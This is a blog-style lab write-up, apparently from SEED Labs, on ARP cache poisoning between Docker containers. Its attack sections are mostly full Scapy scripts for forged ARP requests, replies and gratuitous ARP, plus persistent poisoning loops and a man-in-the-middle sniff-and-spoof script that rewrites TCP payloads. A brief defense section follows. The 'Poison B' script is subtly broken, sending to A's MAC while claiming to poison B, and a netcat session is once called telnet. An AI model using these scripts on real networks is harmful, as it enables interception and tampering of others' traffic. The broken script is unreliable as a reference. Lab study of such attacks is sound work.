---
layout: post
title: "ARP Cache Poisoning"
category: seed-labs
tags: [networking, arp, mitm, scapy, packet-spoofing]
date: december 5, 2025
---

## Overview

ARP (Address Resolution Protocol) is how machines on a local network map IP addresses to MAC addresses. The protocol has no authentication or verification mechanism, which makes it easy to abuse. By sending forged ARP packets, an attacker can poison a victim's ARP cache and trick it into associating the gateway's IP address with the attacker's MAC address. From that point, traffic meant for the gateway gets redirected to the attacker instead. This can lead to a denial of service or a man-in-the-middle (MITM) attack where the attacker can sniff and modify packets.

This lab gave me hands-on experience with ARP cache poisoning and showed how damaging it can be in practice. The main goal was to use ARP poisoning to launch a MITM attack between two victim machines (A and B), where all traffic between them passes through the attacker machine (M). Scapy was used to craft and send all forged packets.

## Environment Setup

The lab used three Docker containers connected on the same LAN:

| Container | IP | MAC |
|---|---|---|
| Host A (victim) | 10.9.0.5 | 02:42:0a:09:00:05 |
| Host B (victim) | 10.9.0.6 | 02:42:0a:09:00:06 |
| Host M (attacker) | 10.9.0.105 | 02:42:0a:09:00:69 |

Setting up Docker took longer than expected. My terminal could not pull images from the registry due to firewall issues. After troubleshooting, I connected my VPN to the terminal and allowed LAN traffic through it, which finally let Docker run.

Containers were started with `dcup` and listed with `dockps`:

```
a8e8a1681dbd    B-10.9.0.6
ed1ea03aa394    M-10.9.0.105
fc4704a350bd    A-10.9.0.5
```

Each container shell was renamed by IP for clarity:

```bash
# Attacker shell
docksh ed
export PS1="\w M-10.9.0.105$ "

# Host B shell
docksh a8
export PS1="\w B-10.9.0.6"

# Host A shell
docksh fc
export PS1="\w A-10.9.0.5$ "
```

MAC addresses and IPs were collected from each container:

```bash
cat /sys/class/net/eth0/address
ip -4 addr show eth0
```

## Attack Methodology

### Task 1.A - ARP Request Attack

This script sends forged ARP request packets on eth0. It claims that B's IP (10.9.0.6) belongs to the attacker's MAC. The Ethernet frame goes to the broadcast address so all hosts on the LAN receive it. The packet is sent five times at one-second intervals.

```python
#!/usr/bin/env python3
from scapy.all import Ether, ARP, sendp

iface   = "eth0"
A_IP    = "10.9.0.5"
A_MAC   = "02:42:0a:09:00:05"
B_IP    = "10.9.0.6"
ATT_MAC = "02:42:0a:09:00:69"

pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=ATT_MAC) / \
      ARP(op=1, psrc=B_IP, hwsrc=ATT_MAC, pdst=A_IP, hwdst="00:00:00:00:00:00")
sendp(pkt, iface=iface, inter=1, count=5)
```

```bash
chmod +x /volumes/arp_request.py
python3 /volumes/arp_request.py
# .....
# Sent 5 packets.
```

Checking A's ARP cache after the attack:

```
/ A-10.9.0.5$ arp -n
Address         HWtype  HWaddress           Flags Mask   Iface
10.9.0.6        ether   02:42:0a:09:00:69   C             eth0
```

A's cache now maps B's IP to the attacker's MAC.

### Task 1.B - ARP Reply Attack

**Scenario 1: A has a valid cache entry for B**

This script sends a forged ARP reply directly to host A. The Ethernet destination is A's MAC so only A receives it. The reply falsely claims that B's IP belongs to the attacker's MAC.

```python
#!/usr/bin/env python3
from scapy.all import Ether, ARP, sendp

iface   = "eth0"
A_IP    = "10.9.0.5"
A_MAC   = "02:42:0a:09:00:05"
B_IP    = "10.9.0.6"
ATT_MAC = "02:42:0a:09:00:69"

pkt = Ether(dst=A_MAC, src=ATT_MAC) / \
      ARP(op=2, psrc=B_IP, hwsrc=ATT_MAC, pdst=A_IP, hwdst=A_MAC)
sendp(pkt, iface=iface, inter=1, count=5)
```

Before and after arp -n on A:

```
# Before
Address         HWtype  HWaddress           Flags Mask   Iface
10.9.0.6        ether   02:42:0a:09:00:06   C             eth0

# After
Address         HWtype  HWaddress           Flags Mask   Iface
10.9.0.6        ether   02:42:0a:09:00:69   C             eth0
```

**Scenario 2: A has no cache entry for B**

After deleting A's entry with `arp -d 10.9.0.6` and running the same attack, it failed. A received the packets (confirmed via tcpdump on M) but did not update its cache. This proves that an ARP reply can only overwrite an existing entry, not create a new one.

```
/ M-10.9.0.105$ tcpdump -i eth0 -n arp
02:42:16.887194 ARP, Reply 10.9.0.6 is-at 02:42:0a:09:00:69, length 28
02:42:17.889541 ARP, Reply 10.9.0.6 is-at 02:42:0a:09:00:69, length 28
...
5 packets captured
```

Packets were sent and received, but A's cache stayed empty.

### Task 1.C - Gratuitous ARP

This script sends a broadcast ARP request where the attacker uses B's IP as both sender and target while using its own MAC as the sender hardware address.

```python
#!/usr/bin/env python3
from scapy.all import Ether, ARP, sendp

iface   = "eth0"
B_IP    = "10.9.0.6"
ATT_MAC = "02:42:0a:09:00:69"

pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=ATT_MAC) / \
      ARP(op=1, psrc=B_IP, pdst=B_IP, hwsrc=ATT_MAC, hwdst="ff:ff:ff:ff:ff:ff")
sendp(pkt, iface=iface, inter=1, count=5)
```

After pinging B to restore a valid cache entry in A, the gratuitous ARP was sent. Result in A's cache:

```
/ A-10.9.0.5$ arp -n
Address         HWtype  HWaddress           Flags Mask   Iface
10.9.0.6        ether   02:42:0a:09:00:69   C             eth0
```

### Task 2 - Full MITM Attack via ARP Poisoning

Two scripts run in the background continuously, one poisoning A's cache and one poisoning B's cache.

**Poison A** (tell A that B's IP is at M's MAC):

```python
#!/usr/bin/env python3
from scapy.all import Ether, ARP, sendp

iface   = "eth0"
A_IP    = "10.9.0.5"
A_MAC   = "02:42:0a:09:00:05"
B_IP    = "10.9.0.6"
ATT_MAC = "02:42:0a:09:00:69"

pkt = Ether(dst=A_MAC, src=ATT_MAC) / \
      ARP(op=2, psrc=B_IP, hwsrc=ATT_MAC, pdst=A_IP, hwdst=A_MAC)
sendp(pkt, iface=iface, inter=1, count=5)
```

**Poison B** (tell B that A's IP is at M's MAC):

```python
#!/usr/bin/env python3
from scapy.all import Ether, ARP, sendp

iface   = "eth0"
A_IP    = "10.9.0.5"
A_MAC   = "02:42:0a:09:00:05"
B_IP    = "10.9.0.6"
ATT_MAC = "02:42:0a:09:00:69"

pkt = Ether(dst=A_MAC, src=ATT_MAC) / \
      ARP(op=2, psrc=A_IP, hwsrc=ATT_MAC, pdst=B_IP, hwdst=A_MAC)
sendp(pkt, iface=iface, inter=1, count=5)
```

Both scripts were run as background loops:

```bash
nohup bash -c 'while true; do python3 /volumes/arp_reply-HOST-A.py; sleep 5; done' \
    >/volumes/poison_HOST-A.log 2>&1 &

nohup bash -c 'while true; do python3 /volumes/arp_reply-HOST-B.py; sleep 5; done' \
    >/volumes/poison_HOST-B.log 2>&1 &
```

After confirming both pings were routing through M (seen via tcpdump), IP forwarding was enabled so traffic still reaches its destination:

```bash
sysctl -w net.ipv4.ip_forward=1
# net.ipv4.ip_forward = 1
```

A netcat session was opened from A to B. The sniff-and-spoof script below ran on M and replaced all TCP payload data with 'Z' characters:

```python
#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
IP_B = "10.9.0.6"

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        newpkt = IP(bytes(pkt[IP]))
        del newpkt.chksum
        del newpkt[TCP].payload
        del newpkt[TCP].chksum

        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            newdata = b"Z" * len(data)
            send(newpkt / newdata)
        else:
            send(newpkt)

    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))
        del newpkt.chksum
        del newpkt[TCP].chksum
        send(newpkt)

f = f"tcp and ((src host {IP_A} and dst host {IP_B}) or (src host {IP_B} and dst host {IP_A}))"
sniff(iface="eth0", filter=f, prn=spoof_pkt)
```

Every keystroke typed in the telnet session appeared as 'Z' on the other end.

### Task 3 - Payload Replacement with Custom String

The sniff-and-spoof script was modified to replace a specific name in the payload instead of replacing all data with 'Z'. It scans each TCP payload for occurrences of `my_name` and replaces them with 'A' characters of the same length.

```python
#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
IP_B = "10.9.0.6"

my_name = b"assmaa"

def spoof_pkt(pkt):
    if pkt.haslayer(IP) and pkt.haslayer(TCP):
        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
            newpkt = IP(bytes(pkt[IP]))
            del newpkt.chksum
            del newpkt[TCP].payload
            del newpkt[TCP].chksum

            if pkt[TCP].payload:
                data = pkt[TCP].payload.load
                print(f"Original Payload: {data}")
                newdata = data.replace(my_name, b"A" * len(my_name))
                print(f"Modified Payload: {newdata}")
                send(newpkt / newdata, verbose=False)
            else:
                send(newpkt, verbose=False)

        elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
            newpkt = IP(bytes(pkt[IP]))
            del newpkt.chksum
            del newpkt[TCP].chksum
            send(newpkt, verbose=False)

f = f"tcp and ((src host {IP_A} and dst host {IP_B}) or (src host {IP_B} and dst host {IP_A}))"
sniff(iface="eth0", filter=f, prn=spoof_pkt)
```

Netcat was used between A and B. Messages typed on A containing "assmaa" arrived at B as "AAAAAA". Messages not containing the name passed through unchanged.

```
# A typed:          assmaa is a masters student
# B received:       AAAAAA is a masters student
```

## Key Findings

- ARP reply attacks can only update existing cache entries. If the target has no entry, the reply is ignored.
- Gratuitous ARP and ARP request attacks can create new entries.
- Continuous poisoning is necessary because ARP caches refresh over time.
- Once ARP poisoning is in place and IP forwarding is enabled, all traffic between two hosts can be intercepted and modified without either victim noticing.

## Defense Implications

- Static ARP entries for critical hosts (like the gateway) prevent poisoning but are not practical at scale.
- Dynamic ARP Inspection (DAI) on managed switches validates ARP packets against a trusted DHCP snooping table.
- Monitoring for duplicate IP-to-MAC mappings on the network can help detect poisoning attempts early.
- Encrypting traffic with TLS or SSH limits what an attacker can do even after gaining MITM positioning.

## Tools Used

- Scapy (Python packet crafting library)
- Docker (containerized lab environment)
- tcpdump (packet capture and verification)
- Linux networking tools (arp, ip addr, ip neigh, ping, netcat)
